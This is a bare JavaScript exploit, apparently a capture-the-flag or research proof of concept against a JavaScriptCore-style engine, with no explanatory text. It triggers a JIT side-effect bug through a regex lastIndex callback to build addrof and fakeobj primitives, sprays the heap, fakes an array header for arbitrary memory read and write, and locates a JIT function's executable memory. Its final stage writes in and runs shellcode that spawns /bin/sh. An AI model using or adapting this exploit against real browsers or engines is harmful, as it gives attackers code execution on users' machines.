var buffer = new ArrayBuffer(8);
var u8 = new Uint8Array(buffer);
var u32 = new Uint32Array(buffer);
var f64 = new Float64Array(buffer);
var BASE = 0x100000000;
function i2f(i) {
    u32[0] = i%BASE;
    u32[1] = i/BASE;
    return f64[0];
}
function f2i(f) {
    f64[0] = f;
    return u32[0] + BASE*u32[1];
}
function hex(x) {
    if (x < 0)
        return `-${hex(-x)}`;
    return `0x${x.toString(16)}`;
}

function addrof(obj){

    var victim_array = [1.1];
    var reg = /abc/y;

    var funcToJIT = function(array){
        'abc'.match(reg);
        return array[0];
    }

    for(var i=0; i < 10000; i++){
        funcToJIT(victim_array);
    }

    regexLastIndex = {};
    regexLastIndex.toString = function(){
        victim_array[0] = obj;
        return "0";
    };
    reg.lastIndex = regexLastIndex;

    return funcToJIT(victim_array)
}

function fakeobj(addr){

    var victim_array = [1.1];
    var reg = /abc/y;

    var funcToJIT = function(array){
        'abc'.match(reg);
        array[0] = addr;
    }

    for(var i=0; i < 10000; i++){
        funcToJIT(victim_array);
    }

    regexLastIndex = {};
    regexLastIndex.toString = function(){
        victim_array[0] = {};
        return "0";
    }
    reg.lastIndex = regexLastIndex;
    funcToJIT(victim_array);

    return victim_array[0];
}

var spray = []
for (var i = 0; i < 1000; ++i) {
    var obj = [1.1];
    obj.a = 2.2;
    obj['p'+i] = 3.3;
    spray.push(obj);
}

u32[0] = 0x200;
u32[1] = 0x01082107 - 0x10000;
var header_arrayDouble = f64[0];
u32[1] = 0x01082109 - 0x10000;
var header_arrayContigous = f64[0];

controller = spray[500];

victim = {
    fake_header:header_arrayDouble,
    fake_butterfly:controller
};

victim_addr = f2i(addrof(victim));
hax = fakeobj(i2f(victim_addr+0x10));

var unboxed = [2.2];
unboxed[0] = 3.3;
var boxed = [{}];
hax[1] = unboxed;
var shared = controller[1];
hax[1] = boxed;
controller[1] = shared;
victim.fake_header = header_arrayDouble;

var stage2 = {
    addrof : function (obj){
        boxed[0] = obj;
        return f2i(unboxed[0]);
    },
    fakeobj : function (addr){
        unboxed[0] = i2f(addr);
        return boxed[0];
    },
    read64 : function (addr){
        hax[1] = i2f(addr+0x10);
        return this.addrof(controller.a);
    },
    write64 : function (addr, content){
        hax[1] = i2f(addr+0x10);
        controller.a = this.fakeobj(content);
    },
    passGC : function (){
        var passObj = {};
        passObj[0] = 1.1;
        this.write64(this.addrof(passObj+8), 0x7);
    },
    getJITFunction : function (){
        function target(num) {
            for (var i = 2; i < num; i++) {
                if (num % i === 0) {
                    return false;
                }
            }
            return true;
        }

        for (var i = 0; i < 1000; i++) {
            target(i);
        }
        for (var i = 0; i < 1000; i++) {
            target(i);
        }
        for (var i = 0; i < 1000; i++) {
            target(i);
        }
        return target;
    },
    getRWXMem: function(){
        shellcodeFunc = this.getJITFunction()
        target_addr = this.read64(this.addrof(shellcodeFunc)+8*3)
        target_addr = this.read64(target_addr + 8*3)
        target_addr = this.read64(target_addr + 8*4)
        return [shellcodeFunc, target_addr]
    },
    injectShellcode : function (addr, shellcode){
        var theAddr = addr;
        this.passGC();
        for(var i=0, len=shellcode.length; i < len; i++){
            if(i == 0x1f){
                this.passGC();
            }
            this.write64(target_addr+i, shellcode[i].charCodeAt());
        }
    },
    pwn : function(){
        shellcodeObj = this.getRWXMem();
        print(hex(shellcodeObj[1]));
        shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xc0\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05";
        this.injectShellcode(shellcodeObj[1], shellcode);
        var shellcodeFunc = shellcodeObj[0];
        shellcodeFunc();
    },
};

stage2.pwn();